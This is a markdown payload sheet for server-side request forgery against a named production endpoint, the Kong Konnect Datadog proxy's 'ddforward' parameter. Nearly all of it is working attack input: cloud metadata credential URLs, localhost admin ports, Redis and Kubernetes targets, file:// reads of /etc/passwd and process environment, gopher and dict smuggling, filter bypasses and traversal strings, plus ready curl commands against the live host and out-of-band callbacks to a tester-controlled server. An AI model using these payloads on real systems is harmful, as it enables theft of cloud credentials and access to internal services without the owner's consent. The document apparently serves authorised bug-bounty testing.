# SSRF Test Payloads for Kong Konnect

## Target: Datadog Proxy Endpoint

**Base URL:** `https://us.api.konghq.com/datadog`

**Parameter:** `ddforward`

**Normal Usage:**
```
/datadog?ddforward=/api/v2/rum?ddsource=browser&dd-api-key=pub8eb5e95dbb84d86f5b47cb7dc8423b65...
```

---

## SSRF Test Payloads

### 1. AWS Metadata (Cloud SSRF)
```bash
# Direct
?ddforward=http://169.254.169.254/latest/meta-data/
?ddforward=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# URL encoded
?ddforward=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F

# IPv6
?ddforward=http://[::ffff:169.254.169.254]/latest/meta-data/

# Decimal IP
?ddforward=http://2852039166/latest/meta-data/

# Octal IP
?ddforward=http://0251.0376.0251.0376/
```

### 2. Internal Services
```bash
# Localhost
?ddforward=http://localhost/
?ddforward=http://localhost:8001/  # Kong Admin API
?ddforward=http://localhost:8444/  # Kong Admin API SSL
?ddforward=http://127.0.0.1/
?ddforward=http://127.0.0.1:6379/  # Redis
?ddforward=http://127.0.0.1:5432/  # PostgreSQL

# Kubernetes internal
?ddforward=http://kubernetes.default.svc/
?ddforward=http://kubernetes.default.svc.cluster.local/
?ddforward=http://kube-dns.kube-system.svc.cluster.local/

# Common internal hostnames
?ddforward=http://redis/
?ddforward=http://postgres/
?ddforward=http://elasticsearch:9200/
?ddforward=http://internal-api/
```

### 3. Protocol Smuggling
```bash
# File protocol
?ddforward=file:///etc/passwd
?ddforward=file:///proc/self/environ

# Gopher (for Redis/SMTP attacks)
?ddforward=gopher://127.0.0.1:6379/_INFO

# Dict protocol
?ddforward=dict://127.0.0.1:6379/INFO
```

### 4. Bypass Techniques
```bash
# Double URL encoding
?ddforward=http%253A%252F%252F169.254.169.254%252F

# With @ symbol
?ddforward=http://evil.com@169.254.169.254/

# DNS rebinding domain
?ddforward=http://169.254.169.254.nip.io/

# Redirect bypass
?ddforward=http://your-server.com/redirect?url=http://169.254.169.254/

# IPv6 localhost
?ddforward=http://[::1]/
?ddforward=http://[0:0:0:0:0:0:0:1]/

# Short URLs
?ddforward=http://0/
?ddforward=http://127.1/
```

### 5. Path Traversal in Proxy
```bash
?ddforward=/../../../etc/passwd
?ddforward=/..%2F..%2F..%2Fetc%2Fpasswd
?ddforward=/.%00/../etc/passwd
```

---

## Expected Responses

| Response | Meaning |
|----------|---------|
| 400 Bad Request | Blocked by validation |
| 403 Forbidden | Blocked by WAF/firewall |
| 500 Internal Error | Might indicate partial success |
| 200 with data | **VULNERABLE** |
| Connection timeout | Might be reaching internal network |

---

## Testing with curl

```bash
# Replace YOUR_AUTH_TOKEN with actual Bearer token from browser

# Test 1: AWS Metadata
curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" \
  "https://us.api.konghq.com/datadog?ddforward=http://169.254.169.254/latest/meta-data/"

# Test 2: Localhost
curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" \
  "https://us.api.konghq.com/datadog?ddforward=http://localhost:8001/"

# Test 3: Your controlled server (to see if request arrives)
curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" \
  "https://us.api.konghq.com/datadog?ddforward=http://YOUR_SERVER.com/ssrf-test"
```

---

## Webhook.site / Burp Collaborator Test

1. Go to https://webhook.site and get a unique URL
2. Use it in ddforward:
```
?ddforward=https://webhook.site/YOUR-UNIQUE-ID
```
3. Check if Kong's server makes a request to your URL
4. If yes → **SSRF confirmed**

---

## Notes

- This proxy is meant to forward to Datadog API only
- Security depends on URL validation implementation
- Even partial SSRF (like seeing timeouts on internal IPs) is reportable
- Don't try to exfiltrate actual data - just prove reachability

